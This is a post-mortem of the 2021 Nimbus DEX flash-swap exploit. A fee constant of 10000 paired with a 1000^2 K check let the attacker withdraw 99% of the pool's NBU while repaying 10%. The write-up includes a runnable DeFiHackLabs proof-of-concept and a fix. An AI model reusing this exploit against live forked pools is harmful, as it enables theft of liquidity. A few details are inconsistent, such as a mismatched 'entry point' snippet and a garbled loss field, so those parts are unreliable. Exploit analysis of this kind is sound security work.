# Nimbus DEX — K Invariant Constant Mismatch (10000 vs 1000) Analysis

| Field | Details |
|------|------|
| **Date** | 2021-09-21 |
| **Protocol** | Nimbus DEX |
| **Chain** | Ethereum |
| **Loss** | Address unconfirmed (majority of pool liquidity) |
| **Attacker** | [0x5676e585bf16387bc159fd4f82416434cda5f1a3](https://etherscan.io/address/0x5676e585bf16387bc159fd4f82416434cda5f1a3) |
| **Attack Tx** | Address unconfirmed (fork block: 13,225,516) |
| **Vulnerable Contract** | [0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62](https://etherscan.io/address/0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62) (NWETH/NBU Pair) |
| **Root Cause** | Identical to Uranium Finance — K invariant constant mismatch: reserves multiplied by 10000, but K validation uses 1000^2 |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-09/Nimbus_exp.sol) |

---
## 1. Vulnerability Overview

The Nimbus DEX pair contract is a Uniswap V2 fork modified to use `10000` for fee calculations. However, the original `1000^2` was left in place for K invariant validation. This is the exact same vulnerability as the April 2021 Uranium Finance exploit. The attacker flash-swapped 99% of the NBU balance from the NWETH/NBU pair (0xA0Ff...) and repaid only 10% of the withdrawn amount to pass the K invariant check.

---
## 2. Vulnerable Code Analysis

### 2.1 swap() — 10000 vs 1000 K Invariant Mismatch

```solidity
// ❌ Nimbus Pair @ 0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62
// Uniswap V2 fork + fee constant changed but K validation not updated

function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {
    // ...
    uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(fee)); // uses 10000
    uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(fee)); // uses 10000

    // ❌ K validation uses 1000^2 = 1,000,000 — should be 10000^2 = 100,000,000
    // Actual K passes at a 100x lower threshold → allows 99% withdrawal
    require(
        balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2),
        'Nimbus: K'
    );
}
```

**Fixed Code**:
```solidity
// ✅ Fee constant and K validation constant aligned
uint256 private constant FEE_DENOMINATOR = 10000;

function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {
    uint balance0Adjusted = balance0.mul(FEE_DENOMINATOR).sub(amount0In.mul(fee));
    uint balance1Adjusted = balance1.mul(FEE_DENOMINATOR).sub(amount1In.mul(fee));

    require(
        balance0Adjusted.mul(balance1Adjusted) >=
            uint(_reserve0).mul(_reserve1).mul(FEE_DENOMINATOR**2),
        'Nimbus: K'
    );
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**NimbusPair.sol** — Entry point:
```solidity
// ❌ Root cause: same K invariant constant mismatch as Uranium Finance — reserves multiplied by 10000 but K validation uses 1000^2
    function _safeTransfer(address token, address to, uint value) private {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));  // ❌ external call — reentrancy possible
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'Nimbus: TRANSFER_FAILED');
    }
```

## 3. Attack Flow

```
┌──────────────────────────────────────────────────────────┐
│ Step 1: Calculate 99% of NBU balance                     │
│ amount = NBU.balanceOf(pair) * 99 / 100                  │
│ NBU @ 0xEB58343b36C7528F23CAAe63a150240241310049         │
└─────────────────────┬────────────────────────────────────┘
                      │
┌─────────────────────▼────────────────────────────────────┐
│ Step 2: IUniswapV2Pair(pair).swap(0, amount, this, data) │
│ pair @ 0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62       │
│ Withdraw 99% NBU, execute fallback() callback            │
└─────────────────────┬────────────────────────────────────┘
                      │ fallback() callback
┌─────────────────────▼────────────────────────────────────┐
│ Step 3: Repay only 10% of withdrawn NBU to pair          │
│ NBU.transfer(pair, NBU.balanceOf(this) / 10)             │
│ K check: (balance*10000)^2 >= (reserve*reserve*1000^2)   │
│ Passes with 100x margin                                  │
└─────────────────────┬────────────────────────────────────┘
                      │
┌─────────────────────▼──────────────────────────────────┐
│ Step 4: Attacker retains 90% of withdrawn NBU (profit)  │
└────────────────────────────────────────────────────────┘
```

---
## 4. PoC Code (DeFiHackLabs)

```solidity
// testExploit() — mainnet fork block 13,225,516
function testExploit() public {
    console.log("Before exploiting", IERC20(nbu).balanceOf(address(this)));

    // Flash-swap 99% of pair's NBU
    uint256 amount = IERC20(nbu).balanceOf(pair) * 99 / 100;
    // pair = 0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62 (NWETH/NBU)
    // nbu  = 0xEB58343b36C7528F23CAAe63a150240241310049

    IUniswapV2Pair(pair).swap(0, amount, address(this), abi.encodePacked(amount));

    console.log("After exploiting", IERC20(nbu).balanceOf(address(this)));
}

// fallback() — repay only 10% to pass K validation
fallback() external {
    IERC20Custom(nbu).transfer(pair, IERC20(nbu).balanceOf(address(this)) / 10);
    // 10% repaid → K = (balance*10000)^2 >= reserve^2 * 1000^2 passes
    // Retain remaining 90%
}
```

---
## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Mismatch between fee constant (10000) and K validation constant (1000) — identical to Uranium Finance | CRITICAL | CWE-682 |
| V-02 | Deployment with modified constants without reviewing forked code | HIGH | CWE-20 |

---
## 6. Remediation Recommendations

```solidity
// ✅ Unify fee constant + add K validation consistency tests
// ✅ When forking, verify that all modified constants are reflected across every mathematical invariant

// Invariant unit test
function test_K_invariant_after_swap() public {
    uint reserveIn = 1000e18;
    uint reserveOut = 1000e18;
    uint amountIn = 100e18;

    uint balanceInAdj = (reserveIn + amountIn) * FEE_DENOMINATOR - amountIn * FEE;
    uint amountOut = ...; // calculate

    uint balanceOutAdj = (reserveOut - amountOut) * FEE_DENOMINATOR;

    // This assertion must match the validation inside swap()
    assert(balanceInAdj * balanceOutAdj >= reserveIn * reserveOut * FEE_DENOMINATOR**2);
}
```

---
## 7. Lessons Learned

- **The same vulnerability recurred in Nimbus (September) just five months after Uranium Finance (April).** Publicly disclosed exploits must be incorporated into project audit checklists.
- **Uniswap V2 fork projects must review the entire K invariant formula when changing fee constants.** If a single constant appears in multiple places, it should be unified as a named constant.
- **Auditors must analyze the diff between forked code and the original, and verify that every modified constant has been consistently applied across all related formulas.**